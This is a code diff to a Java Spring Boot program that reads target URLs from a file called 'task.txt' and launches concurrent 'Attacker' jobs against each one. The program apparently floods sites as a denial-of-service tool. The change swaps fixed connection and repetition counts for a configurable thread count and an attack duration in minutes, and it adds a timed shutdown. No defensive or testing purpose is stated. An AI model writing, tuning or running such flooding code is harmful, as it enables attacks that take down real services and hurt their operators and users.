@@ -9,13 +9,14 @@ import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 @SpringBootApplication
 public class DemoApplication {
 
     private static ExecutorService executorService;
-    private static int connectionsCount = 1000;
-    private static int attackTimes = 10000000;
+    private static int threadsCount = 100;
+    private static int attackDuration = 1;
 
     static {
         executorService = Executors.newVirtualThreadPerTaskExecutor();
@@ -26,26 +27,30 @@ public class DemoApplication {
         var urls = FileParser.getUrls("task.txt");
         isArgsPresent(args);
         printConsole("Attacks started.");
-        for (String url : urls) {
-            executorService.submit(Thread.ofVirtual().start(Attacker.builder()
-                    .hostName(url)
-                    .connectionsCount(connectionsCount)
-                    .attackTimes(attackTimes)
-                    .build()));
-        }
+        urls.forEach(DemoApplication::submitThreads);
+        shutdownAll();
+    }
+
+    private static void shutdownAll() {
         try {
-            Thread.currentThread().join();
+            executorService.awaitTermination(attackDuration, TimeUnit.MINUTES);
         } catch (InterruptedException e) {
-            printConsole(e.getMessage());
+            printConsole("Attacks finished.");
         }
-        executorService.shutdown();
-        printConsole("Attacks finished.");
+    }
+
+    private static void submitThreads(String url) {
+        for (int i = 0; i < threadsCount; i++) {
+            executorService.submit(Attacker.builder()
+                    .hostName(url)
+                    .build());
+        }
     }
 
     private static void isArgsPresent(String[] args) {
         if (args.length > 0) {
-            connectionsCount = Integer.parseInt(args[0]);
-            attackTimes = Integer.parseInt(args[1]);
+            attackDuration = Integer.parseInt(args[0]);
+            threadsCount = Integer.parseInt(args[1]);
         }
     }
 
